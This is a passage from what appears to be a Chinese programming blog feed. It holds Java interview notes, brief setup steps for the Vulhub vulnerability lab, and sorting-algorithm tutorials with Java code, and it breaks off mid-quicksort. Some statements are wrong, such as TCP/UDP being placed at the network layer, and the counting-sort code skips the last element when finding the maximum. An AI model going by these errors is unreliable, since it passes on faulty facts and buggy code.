    <content type="text"><![CDATA[1、HashMap和HashTable区别HashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能 HashTable继承Dictionary，HashMap继承的是java2出现的Map接口； HashMap允许将null作为key或value，hashtable不允许； HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好； 由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable； HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。 HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey HashTable中数组默认大小是11，扩容方法是old*2+1;HashMap默认大小是16，扩容每次为2的指数大小 2、Object的hashcode方法，equals方法，常用的地方3、HashMap的原理应用场景简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。 4、JDK中有哪些线程池Java中通过Executors提供四种线程池： newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。 newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待 newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行 newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行） 5、TCP/UDP区别相同点： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。 TCP UDP 1 Transmission Control Protocol 传输控制协议 User Data Protocol 用户数据报协议 2 TCP的传输是可靠传输 UDP的传输是不可靠传输 3 TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接 UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去 4 TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信 UDP是一种不可靠的网络服务，负载相对较小 5 TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息 UDP包含长度和检验和信息 6 TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端 UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端 7 TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢 UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快 8 TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制 UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境 6、查找一个数组的中位数7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。8、Object类中的方法9、对象比较是否相等10、toString方法的常用地方，为什么要重写该方法11、HashMap put方法怎么判断是否是重复方法12、Set和List的区别13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别14、TreeSet对存入的数据有什么要求吗？15、HashSet是不是线程安全的16、Java中有哪些线程安全的Map17、CocurrentHashMap是怎么做到线程安全的18、如何保证线程安全问题19、volatile原子性问题？为什么i++不支持原子性20、CAS操作21、lock和synchronized区别22、公平锁和非公平锁23、Java读写锁，读写锁解决的问题24、线程池的原理，为什么要创建线程池？创建线程池的方式？使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能 25、线程的生命周期，什么时候会出现僵死进程？26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？27、volatile、ThreadLocal的使用场景和原理28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。29、JVM内存模型、GC机制和原理30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。31、JVM里有几种classloader，为什么会有多种。JVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。 他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。 当执行java *.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。 32、什么是双亲委派机制，介绍双亲委派的运作过程和好处双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。 采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。 33、什么情况下需要破坏双亲委派机制1、基础类调用用户代码 双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。 为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。 2、OSGi模块化热部署 OSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。 34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。35、红黑树的实现原理和应用场景36、NIO是什么，适用于何种场景37、 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞靶场Vulhub使用]]></title>
    <url>%2Fposts%2F2018-11-01-%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BAVulhub%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[前言 Vulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。 安装 我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装 123456# 安装gityum install git# 安装docker并启动dockeryum install docker &amp;&amp; systemctl start docker# 安装docker-composeyum install docker-compose 由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。 docker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行docker-compose up -d即可启动容器环境。 安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录 1git clone https://github.com/vulhub/vulhub.git 启动漏洞环境 docker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。 在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入flask/ssti目录，执行如下命令，进行漏洞靶场的编译和运行：123cd flask/sstidocker-compose builddocker-compose up -d (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(下)]]></title>
    <url>%2Fposts%2F2018-09-25-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%8B).html</url>
    <content type="text"><![CDATA[前言 上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。 这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要学习的重点是掌握这些排序算法的适用场景。 按照惯例，我先给出一道思考题：如何根据年龄给100万用户排序？，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n*logN)$。有没有更快的排序方法呢？ 桶排序 首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。 桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。 如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k*logk)$。m个桶排序的时间复杂度就是$O(m*k*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n*log\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。 桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？ 答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。 首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。 其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n*logN)$的排序算法了。 桶排序比较适合用在外部排序中，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。 比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？ 现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。 我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 … 99）。 理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。 不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？ 针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元……901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。 计数排序 个人觉得，计数排序其实是桶排序的一种特殊情况。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。 我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？ 考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。 计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。不过，为什么这个算法叫做”计数”排序呢？”计数”的含义来自哪里？ 想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。 考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。 从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。 那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。 思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。 有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。 我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。 以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。 上面的过程有点复杂，我将其写成代码如下，你可以对照看下。 123456789101112131415161718192021222324252627282930313233343536373839public class CountSort &#123; public static void main(String[] args) &#123; int[] a = new int[] &#123;5,4,2,6,2,3,5,1,4,8,5,9,6,7,8,10,3,4,2,0&#125;; // 20个人的成绩进行计数排序 System.out.println("计数排序前："+Arrays.toString(a)); countSort(a); System.out.println("计数排序后："+Arrays.toString(a)); &#125; private static void countSort(int[] a) &#123; int n = a.length; /* 创建桶数组C */ // 1、查找原数组的数据范围（必须是正整数） int max = a[0]; for (int i = 0; i&lt;a.length-1;i++)&#123; if (a[i]&gt;max)&#123; max = a[i]; &#125; &#125; // 2、根据数据范围创建桶数组 int[] C = new int[max+1]; // 2.1、扫描原数组，将数据的个数放入桶C中 for (int anA : a) &#123; C[anA]++; &#125; // 2.2、将C数组中的数据依次累加 for (int i=1;i&lt;=max;i++)&#123; C[i] = C[i-1] + C[i]; &#125; // 3、根据C桶中的计数将原数组a中的数据依次放入A数组中 // 3.1、创建临时数组A int[] A = new int[n]; // 3.2、从后向前扫描a，并根据C放入A for (int i = n-1; i&gt;=0; i--)&#123; A[C[a[i]]-1] = a[i]; C[a[i]]--; &#125; // 4、拷贝数组A到原数组a System.arraycopy(A, 0, a, 0, n); &#125;&#125; 这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。 总结一下，计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。 比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。 基数排序 我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？ 我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。 刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。 借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。 手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下： 注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。 根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。 实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？ 实际上，我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。 总结一下，基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)。 解答开篇 今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。 实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。 内容小结 今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。 桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。 课后思考我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。 假设我们现在需要对 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(中)]]></title>
    <url>%2Fposts%2F2018-09-23-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%AD).html</url>
    <content type="text"><![CDATA[前言 上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，归并排序和快速排序。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。 归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？，这就要用到今天讲的内容。 归并排序的原理 我们先来看看归并排序。 归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。 归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。 从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。分治是一种解决问题的处理思想，递归是一种编程技巧，这两者并不冲突。 前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。 我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。 12345递推公式merge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+1...r))终止条件p&gt;=r 不在继续分解 我来解释一下这个公式，merge_sort(p…r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p…q)和merge_sort(q+1…r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。 有了递推公式，转化成代码就简单多了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// 归并排序public static void merge_sort(int[] a, int n)&#123; merge_sort(a, 0, n-1);&#125;private static void merge_sort(int[] a, int p, int r)&#123; // 递归终止条件 if (p&gt;=r) return; // 获取分区点 int q = p + (r-p)/2; // 分治排序左边 merge_sort(a, p, q); // 分治排序右边 merge_sort(a, q+1, r); // 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r] merge(a, p, q, r);&#125;// 合并数组private static void merge(int[] a, int p, int q, int r)&#123; int i = p; int j = q + 1; int k = 0; // 合并数组 a[p, q] a[q+1, r] 到临时数组temp // 申请一个临时数组 int[] temp = new int[r - p + 1]; // 根据两个数组最短的长度进行比较添加到temp中 while (i&lt;=q&amp;&amp; j&lt;=r)&#123; if (a[i]&lt;=a[j])&#123; temp[k++] = a[i++]; &#125;else &#123; temp[k++] = a[j++]; &#125; &#125; // 看哪个数组还没有完成，将其放到temp后 if (i&lt;=q)&#123; while (i&lt;=q)&#123; temp[k++] = a[i++]; &#125; &#125;else &#123; while (j&lt;=r)&#123; temp[k++] = a[j++]; &#125; &#125; System.out.println(Arrays.toString(temp)); // 将temp中对应的数据放入原数组中 for (i = 0; i &lt;= r-p; i++) &#123; a[p+i] = temp[i]; &#125;&#125; 你可能已经发现了，merge(A[p…r], A[p…q], A[q+1…r])这个函数的作用就是，讲已经有序的A[p…q]和A[q+1…r]合并成另一个有序的数组，并且放入A[p…r]。那这个过程具体该怎么做呢？ 如图所示，我们申请一个临时数组temp，大小与A[p…r]相同。我们用两个指针i，j分别指向A[p…q]和A[q+1…r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。 继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p…r]中。 归并排序的性能分析 还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。 第一、 归并排序是稳定的排序算法吗？ 结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。 在合并的过程中，如果A[p…q]和A[q+1…r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p…q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。 第二、归并排序的时间复杂度是多少？ 归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。 在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。 我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。 从上面的分析，我们得出一个重要的结论：不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式。 套用这个公式，我们来分析一下归并排序的时间复杂度。 我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：$$\begin{cases}T(1) = C; &amp; n=1 \\[2ex]T(n) = 2*T(\frac{n}{2}) + n; &amp; n&gt;1\end{cases}$$ 通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程 $$\begin{align*}T(n) \ &amp;= \ 2*T(\frac{n}{2}) \ + \ n \\[2ex]&amp;= 2*(2 * T(\frac{n}{4}) + \frac{n}{2}) \ + \ n \qquad = 4*T(\frac{n}{4}) + 2*n \\[2ex]&amp;= 4*(2* T(\frac{n}{8}) + \frac{n}{4}) \ + \ 2 * n \ \; = 8*T(\frac{n}{8}) + 3*n \\[2ex]&amp;= 8*(2* T(\frac{n}{16}) + \frac{n}{8}) \ + \ 3 * n \ \; = 16*T(\frac{n}{16}) + 4*n \\[2ex]&amp;= …… \\[2ex]&amp;= 2^{k} * T(\frac{n}{2^{k}}) + k * n\end{align*}$$ 这样一步步推导，我们可以得到$T(n) \ = \ 2^{k} * T(\frac{n}{2^{k}}) + k * n $。当$T(\frac{n}{2^{k}})=T(1)$时，也就是$\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \ = \ Cn + n*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n*log_{2}n)$。所以归并排序的时间复杂度是$O(n*log_{2}n)$。 从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n*log_{2}n)$。 第三、归并排序是不是原地排序算法呢？ 归并排序的时间复杂度在任何情况下都是$O(n*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。 这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n*log_{2}n)$，该如何分析呢？ 如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？ 实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。 快速排序的原理 我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。 快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。 第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。 根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。 如果我们用递推公式来将上面的过程写出来的话，就是这样： 12345# 递推公式quick_sort(p...r) = quick_sort(p...q-1)+quick_sort(q+1...r)# 终止条件p&gt;=r 我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private static void quickSort(int[] arr, int n) &#123; if (n &lt; 1) return; quickSort(arr, 0 , n-1);&#125;private static void quickSort(int[] arr, int left, int right) &#123; if (left&gt;=right) return; int mid = partation(arr, left, right); quickSort(arr, left, mid-1); quickSort(arr, mid+1, right);&#125;// 查找中间位置private static int partation(int[] arr, int left, int right) &#123; int base = arr[left]; int i = left, j = right; while(i&lt;j)&#123; while 